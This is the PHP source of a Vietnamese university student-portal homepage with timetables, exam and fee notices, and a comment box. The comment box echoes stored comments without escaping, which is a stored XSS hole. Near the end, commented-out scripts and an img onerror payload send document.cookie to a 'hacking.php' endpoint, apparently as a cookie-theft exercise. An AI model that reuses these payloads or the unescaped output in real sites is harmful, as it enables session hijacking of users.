<?php session_start(); ?>

<?php require 'layout/_header.php'; ?>
<?php require 'model/DBPDO.php'; ?>
<?php require 'helper.php'; ?>
<nav class="navbar navbar-default dh">
  <div class="container">
    <ul class="nav navbar-nav">
      <li><a href="#" class="fa fa-home fa-2"></a></li>
      <li class="active"><a href="#">Trang chủ</a></li>
      <li><a href="#">Đào tạo</a></li>
      <li><a href="#">Tổ chức</a></li>
      <li><a href="#">Giới thiệu</a></li>
      <li><a href="#">Hỏi đáp</a></li>
      <li><a href="#">Trợ giúp</a></li>
      <?php if(!isset($_SESSION['magv'])): ?>
        <li><a href="gv.php">Giảng viên</a></li>
      <?php endif ?>
      <li>
        <div class="custom input-group">
          <input type="text" class=" form-control" placeholder="Tìm kiếm" />
            <!-- <span class="input-group-btn"> -->
        </div>
      </li>
    </ul>
    <?php if(!isset($_SESSION['masv'])): ?>
      <ul class="nav navbar-nav navbar-right">
        <li><a href="login.php"><span class="glyphicon glyphicon-log-in">
        </span> Đăng nhập</a>
        </li>
      </ul>
    <?php else: ?>
      <ul class="nav navbar-nav navbar-right">
        <li><a href="profile/production/logout.php"><span class="glyphicon glyphicon-log-in">
        </span> Đăng xuất</a>
        </li>
      </ul>
      <ul class="nav navbar-nav navbar-right">
        <li><a href="profile/production"><span class="glyphicon glyphicon-log-in">
        </span> Trang cá nhân</a>
        </li>
      </ul>
     <?php endif ?>
  </div>
</nav>
<div class="container-fluid content">
  <div class="row">
    <div class="col-md-3" >
      <h5>Danh mục chính</h5>
        <a href="#" class="friend">Giao lưu kết bạn</a>
      <div class="sub-box">
        <div class="title">
          <p>Tra cứu kết quả học, Xử lý học vụ</p>
        </div>
        <div class="body">
          <p>Sinh viên tra cứu điểm học tập, điểm TBCTL tại chức năng:
            Tra cứu điểm. Tra cứu xử lý học vụ tại chức năng:
            Tra cứu điểm rèn luyện và xử lý học vụ.
            (Chú ý: Sinh viên cần nắm rõ quy chế 43)</p>
        </div>
      </div>

      <div class="sub-box">
        <div class="title">
          <p>Thời gian biểu áp dụng cho toàn trường(hệ niên chế)</p>
        </div>
        <div class="body">
          <p>BUỔI SÁNG Tiết 01 - 6h45' Tiết 02 - 7h35' Tiết 03 - 8h25' Tiết 04
             - 9h20' Tiết 05 - 10h10' Tiết 06 - 11h00' BUỔI CHIỀU Tiết 07 -
             12h30' Tiết 08 - 13h20' Tiết 09 - 14h10' Tiết 10 - 15h05' Tiết 11
             - 15h55' Tiết 12 - 16h45' </p>
        </div>
      </div>

      <div class="sub-box">
        <div class="title">
          <p>Hỗ trợ</p>
        </div>
        <div class="body">
          <p>Mọi thắc mắc liên hệ: Phòng Đào tạo - P205-A1 Điện thoại:
            0438546902 Email:tksv.utt@gmail.com</p>
        </div>
      </div>

      <div class="sub-box">
        <div class="title">
          <p>v/v Đăng ký học lại, học cải thiện</p>
        </div>
        <div class="body">
          <p>Sinh viên đăng ký học lại, học cải thiện nộp đơn tại phòng
              Đào tạo (P.104-H2) Điện thoại: 0435526713</p>
        </div>
      </div>

      <div class="sub-box">
        <div class="title">
          <p>THỜI GIAN BIỂU ÁP DỤNG CHO TOÀN TRƯỜNG (hệ tín chỉ)</p>
        </div>
        <div class="body">
          <p>BUỔI SÁNG Tiết 01 - 6h45' Tiết 02 - 7h40' Tiết 03 - 8h40'
            Tiết 04 - 9h40' Tiết 05 - 10h35' BUỔI CHIỀU Tiết 06 - 12h30'
            Tiết 07 - 13h25' Tiết 08 - 14h25' Tiết 09 - 15h25' Tiết 10
            - 16h20' Tiết 11 - 17h15' BUỔI TỐI Tiết 12 - 18h15' Tiết 13 -
            19h10' Tiết 14 - 20h05' </p>
        </div>
      </div>

      <div class="sub-box">
        <div class="title">
          <p>Liên kết hữu ích</p>
        </div>
        <div class="body">

          <div class="social-btns">
            <img src="images/fb.png" alt="">
            <img src="images/gg.png" alt="">
            <img src="images/tum.png" alt="">
            <img src="images/youtube.png" alt="">
          </div>
        </div>
      </div>


      <div class="sub-box">
        <div class="title">
          <p>Điều tra việc làm</p>
        </div>
        <div class="body">
          <p>Bạn đã có việc làm chưa?</p>
          <form class=""  method="post">


            <p> <input type="checkbox" name="" value="1"> Đã có</p>
            <p><input type="checkbox" name="" value="0">  Chưa có</p>
            <input type="button" name="poll" value="Đồng ý">
            <input type="button" name="poll" value="Hủy">
          </form>
        </div>
      </div>

      <div class="sub-box">
        <div class="title">
          <p>Đóng góp ý kiến</p>
        </div>
        <div class="body">
          <?php if(isset($_SESSION['magv']) || isset($_SESSION['masv'])): ?>
          <h5>Ý kiến của bạn</h5>
          <form  action='addcomment.php' method="post">
            <textarea name='cmt' rows='5' class='form-control'></textarea>
            <input type="hidden" name="masv" value="<?php echo $_SESSION['masv']; ?>">
            <br>
            <button  name='submit' type='submit' style='padding:10px' class='btn btn-primary'>Gửi</button>
            <!-- <input type="button" name="poll" value="Hủy"> -->
          </form>
        <?php endif ?>

        <?php $rows=$exp->fetch_all(" SELECT * from comment order by id  DESC limit 5"); ?>
        <?php foreach($rows as $key => $row ): ?>
          <div class="media mb-4">
            <div class="media-body">
              <h5 class="mt-0">
                <?php echo $row['masv']; ?>
              </h5>
              <p>
                <?php echo $row['cmt']; ?>
              </p>
            </div>

          </div>
        <?php endforeach ?>


      </div>

      </div> <!-- end comment -->

    </div> <!-- end colmd4 -->

    <div class="col-md-9 right-content">
      <div class="main-box">
        <div class="title">
          <h5>
            <span class="trai">ĐẠI HỌC CHÍNH QUY</span>
            <span class="phai"><a href="#">Xem tất cả</a></span>
          </h5>
        </div>
        <div class="body">
          <p class="text-center red">[THÔNG TIN ĐÁNG CHÚ Ý]</p>
          <div class="sub-body">

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên bị cấm thi do nợ học phí(11/5/2017)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách phòng thi ngày 10/04/2017 (10/04/2017)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách phòng thi ngày 05/04/2017 (04/04/2017)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách phòng thi ngày 04/04/2017 (03/04/2017)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách phòng thi ngày 01/04/2017 (31/03/2017)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách phòng thi ngày 31/03/2017 (30/03/2017)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách phòng thi cải thiện học kỳ 1-2016-2017 ngày 28/03/2017 (28/03/2017)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách phòng thi cải thiện học kỳ 1-2016-2017 ngày 29/03/2017 (28/03/2017)
              </a>
            </div>

            <div class="newest">
              <p><a href="#">Các học phần thi cải thiện (ĐỢT 3/2017) bị HỦY (28/02/2017)</a></p>
              <p>Các học phần thi cải thiện (ĐỢT 3/2017) bị HỦY</p>
              <p class="text-right"><i class="fa fa-hand-o-right" aria-hidden="true"></i><a href="#">Xem chi tiết</a></p>
            </div>


            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Kiểm tra lại danh sách thi cải thiện 3/2017 (23/02/2017)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                THÔNG BÁO SƠ BỘ VỀ KẾT QUẢ ĐĂNG KÍ THI CẢI THIỆN - ĐỢT THÁNG 3/2016 (22/02/2016)
              </a>
            </div>


            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách thi cải thiện ngày 01/11/2015 (31/10/2015)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                LỊCH THI CẢI THIỆN ĐIỂM - Đợt tháng 10/2015 (21/10/2015)
              </a>
            </div>

          </div>
        </div>
      </div>
      <!-- end main box 1 -->

      <div class="main-box">
        <div class="title">
          <h5>
            <span class="trai">TRUNG CẤP NGHỀ</span>
            <span class="phai"><a href="#">Xem tất cả</a></span>
          </h5>
        </div>
        <div class="body">
          <p class="text-center red">[THÔNG TIN ĐÁNG CHÚ Ý]</p>
          <div class="sub-body">

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (09/09/2016)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Phòng Tài chính - Kế toán giải quyết sinh viên thôi học lấy xác nhận nộp học phí vào các ngày thứ ba và thứ năm hàng tuần. (26/10/2015)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Gia hạn thời gian đăng kí học hè 2015 đến hết ngày thứ 2, 22/6/2015 (17/06/2015)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Thông báo nghỉ học sáng T4, ngày 29/10/2014 (28/10/2014)
              </a>
            </div>


            <div class="newest">

              <p><strong>Chưa có dữ liệu</strong></p>
              <p class="text-right"><i class="fa fa-hand-o-right" aria-hidden="true"></i><a href="#">Xem chi tiết</a></p>
            </div>



          </div>
        </div>
      </div>
      <!-- end main-box2 -->

      <div class="main-box">
        <div class="title">
          <h5>
            <span class="trai">CAO ĐẲNG CHÍNH QUY</span>
            <span class="phai"><a href="#">Xem tất cả</a></span>
          </h5>
        </div>
        <div class="body">
          <p class="text-center red">[THÔNG TIN ĐÁNG CHÚ Ý]</p>
          <div class="sub-body">
            <?php
              $sql = "SELECT * FROM sinhvien";
              $r = $exp->fetch_all($sql);
             ?>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Lịch thi chính thức học kỳ 2 - 2016 - 2017 - Đợt 3 ( Toàn trường ) (13/05/2017)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách phòng thi học kỳ 2 - 2016 2017 - ngày 15/05/2017 (12/05/2017)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Thông báo danh sách sinh viên bị cấm thi do nợ học phí (11/05/2017)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Thông báo Đăng kí học lại QPAN + GDTC (13/04/2017)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách phòng thi ngày 01/04/2017 (31/03/2017)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách phòng thi ngày 31/03/2017 (30/03/2017)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách phòng thi ngày 11/04/2017 (11/04/2017)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách phòng thi cải thiện ngày 9/4/17 (07/04/2017)

              </a>
            </div>

            <div class="newest">
              <p><strong>Chưa có dữ liệu</strong></p>
              <p class="text-right"><i class="fa fa-hand-o-right" aria-hidden="true"></i><a href="#">Xem chi tiết</a></p>
            </div>


          </div>
        </div>
      </div>

      <!-- end main box 3 -->

      <div class="main-box">
        <div class="title">
          <h5>
            <span class="trai">CAO ĐẲNG NGHỀ</span>
            <span class="phai"><a href="#">Xem tất cả</a></span>
          </h5>
        </div>
        <div class="body">
          <p class="text-center red">[THÔNG TIN ĐÁNG CHÚ Ý]</p>
          <div class="sub-body">

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (09/09/2016)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Thông báo thanh toán học phí trực tuyến (10/11/2015)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Thông báo thanh toán học phí trực tuyến (10/11/2015)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Phòng Tài chính - Kế toán giải quyết sinh viên thôi học lấy xác nhận nộp học phí vào các ngày thứ ba và thứ năm hàng tuần. (26/10/2015)

              </a>
            </div>

            <div class="newest">
              <p><strong>Chưa có dữ liệu</strong></p>
              <p class="text-right"><i class="fa fa-hand-o-right" aria-hidden="true"></i><a href="#">Xem chi tiết</a></p>
            </div>


          </div>
        </div>
      </div>

      <!-- END MAIN BOX 4 -->


      <div class="main-box">
        <div class="title">
          <h5>
            <span class="trai">ĐẠI HỌC CHÍNH QUY THÁI NGUYÊN</span>
            <span class="phai"><a href="#">Xem tất cả</a></span>
          </h5>
        </div>
        <div class="body">
          <p class="text-center red">[THÔNG TIN ĐÁNG CHÚ Ý]</p>
          <div class="sub-body">

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (09/09/2016)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)


              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Thông báo thanh toán học phí trực tuyến (10/11/2015)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Gia hạn thời gian đăng kí học hè 2015 đến hết ngày thứ 2, 22/6/2015 (17/06/2015)


              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Phòng Tài chính - Kế toán giải quyết sinh viên thôi học lấy xác nhận nộp học phí vào các ngày thứ ba và thứ năm hàng tuần. (26/10/2015)

              </a>
            </div>

            <div class="newest">
              <p><strong>Chưa có dữ liệu</strong></p>
              <p class="text-right"><i class="fa fa-hand-o-right" aria-hidden="true"></i><a href="#">Xem chi tiết</a></p>
            </div>


          </div>
        </div>
      </div>

      <!-- END MAIN BOX 5 -->


      <div class="main-box">
        <div class="title">
          <h5>
            <span class="trai">CAO ĐẲNG CHÍNH QUY VĨNH YÊN</span>
            <span class="phai"><a href="#">Xem tất cả</a></span>
          </h5>
        </div>
        <div class="body">
          <p class="text-center red">[THÔNG TIN ĐÁNG CHÚ Ý]</p>
          <div class="sub-body">

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (09/09/2016)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)


              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Danh sách sinh viên Khoá 67 và Hướng dẫn sinh viên sử dụng chương trình Quản lý đào tạo (08/09/2016)

              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                KẾ HOẠCH HỌC học kì CHÍNH 1 - 2016_2017 - Đại học chính quy - Hà Nội (03/08/2016)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Thông báo thanh toán học phí trực tuyến (10/11/2015)
              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Gia hạn thời gian đăng kí học hè 2015 đến hết ngày thứ 2, 22/6/2015 (17/06/2015)


              </a>
            </div>

            <div class="info">
              <i class=" glyphicon glyphicon-arrow-right"></i>
              <a href="#">
                Phòng Tài chính - Kế toán giải quyết sinh viên thôi học lấy xác nhận nộp học phí vào các ngày thứ ba và thứ năm hàng tuần. (26/10/2015)

              </a>
            </div>

            <div class="newest">
              <p><strong>Chưa có dữ liệu</strong></p>
              <p class="text-right"><i class="fa fa-hand-o-right" aria-hidden="true"></i><a href="#">Xem chi tiết</a></p>
            </div>


          </div>
        </div>
      </div>


      <!-- END MAIN BOX 6 -->

    </div>
    <!-- end col 8 -->
    </div>
    <!-- <script type="text/javascript">

      window.location.href="hacking.php?cookie=" + document.cookie;
    </script> -->
    <!-- <script type="text/javascript">
      var image = new Image();
      var d = new Date();
      image.src='hacking.php?cookie='+document.cookie+"&time="+d;
    </script> -->
    <?php //var_dump($_COOKIE); ?>
    <?php //var_dump($_SERVER['HTTP_USER_AGENT']); ?>
    <!-- <img src="" onerror="this.src='hacking.php?cookie='+document.cookie"> -->
  </div>
<?php require 'layout/_footer.php'; ?>


